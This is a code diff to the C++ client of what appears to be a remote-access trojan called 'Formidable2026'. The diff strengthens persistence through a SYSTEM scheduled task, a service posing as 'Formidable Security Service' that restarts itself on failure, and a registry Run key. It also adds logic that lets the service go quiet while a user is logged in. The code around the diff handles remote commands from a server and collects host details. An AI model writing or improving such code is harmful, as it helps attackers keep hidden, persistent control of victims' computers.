@@ -15,6 +15,7 @@
 #include <ctime>
 #include <atomic>
 #include <thread>
+#include <wtsapi32.h>
 #include "../Common/Config.h"
 #include "../Common/Module.h"
 #include "../Common/Utils.h"
@@ -26,11 +27,15 @@
 #pragma comment(lib, "version.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wtsapi32.lib")
 
 using namespace Formidable;
 
 // 全局上线配置
 CONNECT_ADDRESS g_ServerConfig = DEFAULT_CONFIG;
+
+// 服务运行标志
+bool g_IsService = false;
 
 // 模块缓存
 HMEMORYMODULE g_hTerminalModule = NULL;
@@ -118,6 +123,7 @@ void ProcessPayload() {
 
 // 安装与自启动
 void InstallClient() {
+    OutputDebugStringA("[FRMD26] Entering InstallClient...\n");
     wchar_t szCurrentPath[MAX_PATH];
     GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);
     
@@ -147,11 +153,17 @@ void InstallClient() {
 
     wchar_t szPath[MAX_PATH];
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
+
+    // 路径包含空格时需要引号，特别是服务和注册表启动
+    // 增加缓冲区大小以防止溢出 (MAX_PATH * 2)
+    wchar_t szQuotedPath[MAX_PATH * 2];
+    swprintf_s(szQuotedPath, MAX_PATH * 2, L"\"%s\"", szPath);
     
     // 1. 计划任务自启
     if (g_ServerConfig.taskStartup == 1) {
-        wchar_t szTaskXml[MAX_PATH * 2];
-        swprintf_s(szTaskXml, MAX_PATH * 2,
+        const size_t xmlSize = 4096;
+        wchar_t szTaskXml[xmlSize];
+        swprintf_s(szTaskXml, xmlSize,
             L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
             L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
             L"<RegistrationInfo>"
@@ -197,7 +209,7 @@ void InstallClient() {
             L"</Settings>"
             L"<Actions Context=\"Author\">"
             L"<Exec>"
-            L"<Command>%s</Command>"
+            L"<Command>&quot;%s&quot;</Command>"
             L"</Exec>"
             L"</Actions>"
             L"</Task>",
@@ -212,75 +224,110 @@ void InstallClient() {
             WriteFile(hFile, szTaskXml, (DWORD)(wcslen(szTaskXml) * sizeof(wchar_t)), &written, NULL);
             CloseHandle(hFile);
             
-            wchar_t szCmd[MAX_PATH * 2];
-            // 使用 SYSTEM 权限创建任务
-            swprintf_s(szCmd, MAX_PATH * 2, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f /ru SYSTEM", szTempXml);
+            wchar_t szCmd[4096];
+            // 仅在管理员权限下使用 SYSTEM 账户，否则使用当前用户
+            if (IsAdmin()) {
+                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f /ru SYSTEM", szTempXml);
+            } else {
+                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f", szTempXml);
+            }
+            
             _wsystem(szCmd);
             DeleteFileW(szTempXml);
+            OutputDebugStringA("[FRMD26] Task scheduler entry created.\n");
         }
     }
 
     // 2. 服务自启
     if (g_ServerConfig.serviceStartup == 1) {
-        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-        if (hSCM) {
-            SC_HANDLE hService = CreateServiceW(
-                hSCM, L"Formidable2026", L"Formidable Security Service",
-                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
-                SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
-                szPath, NULL, NULL, NULL, NULL, NULL);
-            
-            if (hService) {
-                // 设置服务失败重启操作
-                SERVICE_FAILURE_ACTIONS fa = { 0 };
-                SC_ACTION actions[3];
-                actions[0].Type = SC_ACTION_RESTART;
-                actions[0].Delay = 60000; // 60秒后重启
-                actions[1].Type = SC_ACTION_RESTART;
-                actions[1].Delay = 60000;
-                actions[2].Type = SC_ACTION_RESTART;
-                actions[2].Delay = 60000;
+        // 如果当前已经是服务进程，无需再次创建或启动服务
+        if (g_IsService) {
+            OutputDebugStringA("[FRMD26] Running as service, skipping service creation.\n");
+        } else {
+            SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            if (hSCM) {
+                SC_HANDLE hService = CreateServiceW(
+                    hSCM, L"Formidable2026", L"Formidable Security Service",
+                    SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+                    SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
+                    szQuotedPath, NULL, NULL, NULL, NULL, NULL);
                 
-                fa.dwResetPeriod = 86400; // 1天后重置失败计数
-                fa.lpRebootMsg = NULL;
-                fa.lpCommand = NULL;
-                fa.cActions = 3;
-                fa.lpsaActions = actions;
-                
-                ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
+                bool bServiceReady = false;
 
-                StartServiceW(hService, 0, NULL);
-                CloseServiceHandle(hService);
-            } else {
-                // 服务可能已存在，尝试打开并更新配置
-                hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
                 if (hService) {
+                    OutputDebugStringA("[FRMD26] Service created successfully.\n");
+                    // 设置服务失败重启操作
                     SERVICE_FAILURE_ACTIONS fa = { 0 };
                     SC_ACTION actions[3];
                     actions[0].Type = SC_ACTION_RESTART;
-                    actions[0].Delay = 60000;
+                    actions[0].Delay = 60000; // 60秒后重启
                     actions[1].Type = SC_ACTION_RESTART;
                     actions[1].Delay = 60000;
                     actions[2].Type = SC_ACTION_RESTART;
                     actions[2].Delay = 60000;
                     
-                    fa.dwResetPeriod = 86400;
+                    fa.dwResetPeriod = 86400; // 1天后重置失败计数
                     fa.lpRebootMsg = NULL;
                     fa.lpCommand = NULL;
                     fa.cActions = 3;
                     fa.lpsaActions = actions;
                     
                     ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
-                    
-                    // 确保服务已启动
-                    SERVICE_STATUS status;
-                    if (QueryServiceStatus(hService, &status) && status.dwCurrentState != SERVICE_RUNNING) {
-                        StartServiceW(hService, 0, NULL);
+
+                    if (StartServiceW(hService, 0, NULL)) {
+                        bServiceReady = true;
                     }
                     CloseServiceHandle(hService);
+                } else {
+                    // 服务可能已存在，尝试打开并更新配置
+                    hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
+                    if (hService) {
+                        OutputDebugStringA("[FRMD26] Service already exists, updating config.\n");
+                        SERVICE_FAILURE_ACTIONS fa = { 0 };
+                        SC_ACTION actions[3];
+                        actions[0].Type = SC_ACTION_RESTART;
+                        actions[0].Delay = 60000;
+                        actions[1].Type = SC_ACTION_RESTART;
+                        actions[1].Delay = 60000;
+                        actions[2].Type = SC_ACTION_RESTART;
+                        actions[2].Delay = 60000;
+                        
+                        fa.dwResetPeriod = 86400;
+                        fa.lpRebootMsg = NULL;
+                        fa.lpCommand = NULL;
+                        fa.cActions = 3;
+                        fa.lpsaActions = actions;
+                        
+                        ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
+                        
+                        // 确保服务已启动
+                        SERVICE_STATUS status;
+                        if (QueryServiceStatus(hService, &status)) {
+                            if (status.dwCurrentState != SERVICE_RUNNING) {
+                                if (StartServiceW(hService, 0, NULL)) {
+                                    bServiceReady = true;
+                                }
+                            } else {
+                                bServiceReady = true; // 已经在运行
+                            }
+                        }
+                        CloseServiceHandle(hService);
+                    } else {
+                        char buf[128];
+                        sprintf_s(buf, "[FRMD26] Failed to create or open service. Error: %u\n", GetLastError());
+                        OutputDebugStringA(buf);
+                    }
                 }
+                CloseServiceHandle(hSCM);
+                
+                // 如果服务成功启动/已经在运行，且当前不是服务进程，则退出
+                if (bServiceReady) {
+                    OutputDebugStringA("[FRMD26] Service started/running. Main process exiting to let service take over.\n");
+                    exit(0);
+                }
+            } else {
+                OutputDebugStringA("[FRMD26] Failed to open SCManager.\n");
             }
-            CloseServiceHandle(hSCM);
         }
     }
 
@@ -288,8 +335,11 @@ void InstallClient() {
     if (g_ServerConfig.registryStartup == 1) {
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
+            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szQuotedPath, (DWORD)(wcslen(szQuotedPath) * 2 + 2));
             RegCloseKey(hKey);
+            OutputDebugStringA("[FRMD26] Registry run key set successfully.\n");
+        } else {
+            OutputDebugStringA("[FRMD26] Failed to open Registry run key.\n");
         }
     }
 
@@ -353,17 +403,34 @@ void GetClientInfo(ClientInfo& info) {
     if (bits == 64) os += " x64";
     else os += " x86";
     strncpy(info.osVersion, os.c_str(), sizeof(info.osVersion) - 1);
+    
     wchar_t wBuf[MAX_PATH];
     DWORD size = MAX_PATH;
     if (GetComputerNameW(wBuf, &size)) {
         std::string utf8 = WideToUTF8(wBuf);
         strncpy(info.computerName, utf8.c_str(), sizeof(info.computerName) - 1);
+    } else {
+        // Fallback for Service/System
+        char envBuf[MAX_PATH];
+        if (GetEnvironmentVariableA("COMPUTERNAME", envBuf, MAX_PATH)) {
+            strncpy(info.computerName, envBuf, sizeof(info.computerName) - 1);
+        } else {
+            strncpy(info.computerName, "Unknown Host", sizeof(info.computerName) - 1);
+        }
     }
     
     size = MAX_PATH;
     if (GetUserNameW(wBuf, &size)) {
         std::string utf8 = WideToUTF8(wBuf);
         strncpy(info.userName, utf8.c_str(), sizeof(info.userName) - 1);
+    } else {
+        // Fallback for Service/System
+        char envBuf[MAX_PATH];
+        if (GetEnvironmentVariableA("USERNAME", envBuf, MAX_PATH)) {
+            strncpy(info.userName, envBuf, sizeof(info.userName) - 1);
+        } else {
+            strncpy(info.userName, "SYSTEM", sizeof(info.userName) - 1);
+        }
     }
     // 硬件与进程信息
     std::string cpu = GetCpuBrand();
@@ -846,6 +913,39 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
     }
 }
 
+// 检测是否存在活跃的用户会话
+bool IsUserSessionActive() {
+    WTS_SESSION_INFOW* pSessions = NULL;
+    DWORD count = 0;
+    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count)) {
+        for (DWORD i = 0; i < count; i++) {
+            // 排除 Session 0 (Services) 并检查状态是否为 Active
+            if (pSessions[i].SessionId != 0 && pSessions[i].State == WTSActive) {
+                // 进一步检查该会话是否有用户登录
+                // 如果是登录界面(WinLogon)，通常没有关联的用户名
+                LPWSTR ppBuffer = NULL;
+                DWORD bytes = 0;
+                bool hasUser = false;
+                
+                if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pSessions[i].SessionId, WTSUserName, &ppBuffer, &bytes)) {
+                    if (ppBuffer && wcslen(ppBuffer) > 0) {
+                        hasUser = true;
+                    }
+                    WTSFreeMemory(ppBuffer);
+                }
+
+                if (hasUser) {
+                    WTSFreeMemory(pSessions);
+                    return true;
+                }
+            }
+        }
+        WTSFreeMemory(pSessions);
+    }
+    
+    return false;
+}
+
 struct ConnectionContext {
     SOCKET s;
     std::string serverIp;
@@ -867,6 +967,14 @@ void HandleConnection(ConnectionContext* ctx) {
     
     std::thread heartbeatThread([ctx]() {
         while (!ctx->bShouldExit->load() && ctx->bConnected->load()) {
+            // 如果是服务进程，检测是否有活跃的用户会话
+            if (g_IsService && IsUserSessionActive()) {
+                OutputDebugStringA("[FRMD26] Active user session detected. Service entering standby (disconnecting).\n");
+                ctx->bShouldExit->store(true);
+                closesocket(ctx->s);
+                break;
+            }
+
             Sleep(30000);
             if (!ctx->bConnected->load() || ctx->bShouldExit->load()) break;
             
@@ -943,18 +1051,6 @@ void ClientMain() {
         OutputDebugStringA(dbgInit);
     }
     
-    // 互斥体防止重复运行 (处理随机上线逻辑)
-    if (g_ServerConfig.iMultiOpen == 0) {
-        // 使用会话级别互斥体，避免跨会话问题
-        std::string mutName = "FRMD26_" + std::string(g_ServerConfig.szServerIP);
-        HANDLE hMutex = CreateMutexA(NULL, TRUE, mutName.c_str());
-        if (GetLastError() == ERROR_ALREADY_EXISTS) {
-            if (hMutex) CloseHandle(hMutex);
-            return;
-        }
-        // 不关闭互斥体句柄，保持进程生命周期
-    }
-
     // 尝试提权运行
     if (g_ServerConfig.runasAdmin == 1) {
         if (!IsAdmin()) {
@@ -967,6 +1063,19 @@ void ClientMain() {
 
     InstallClient(); // 执行安装/自启动
     ProcessPayload(); // 执行载荷逻辑
+
+    // 互斥体防止重复运行 (处理随机上线逻辑)
+    if (g_ServerConfig.iMultiOpen == 0) {
+        // 使用会话级别互斥体，避免跨会话问题
+        std::string mutName = "FRMD26_" + std::string(g_ServerConfig.szServerIP);
+        HANDLE hMutex = CreateMutexA(NULL, TRUE, mutName.c_str());
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            OutputDebugStringA("[FRMD26] 检测到互斥体，进程退出\n");
+            if (hMutex) CloseHandle(hMutex);
+            return;
+        }
+        // 不关闭互斥体句柄，保持进程生命周期
+    }
     
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -1076,6 +1185,13 @@ void ClientMain() {
         int failedAttempts = 0;
         
         while (true) {
+            // 如果是服务进程，检测是否有活跃的用户会话
+            if (g_IsService && IsUserSessionActive()) {
+                OutputDebugStringA("[FRMD26] Active user session detected. Service entering standby.\n");
+                Sleep(5000);
+                continue;
+            }
+
             const std::string& serverIp = ipList[currentIpIndex % ipList.size()];
             if (serverIp.empty()) {
                 currentIpIndex++;
@@ -1142,6 +1258,7 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
 }
 
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
+    g_IsService = true;
     SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(L"Formidable2026", ServiceCtrlHandler);
     if (!hStatus) return;
 
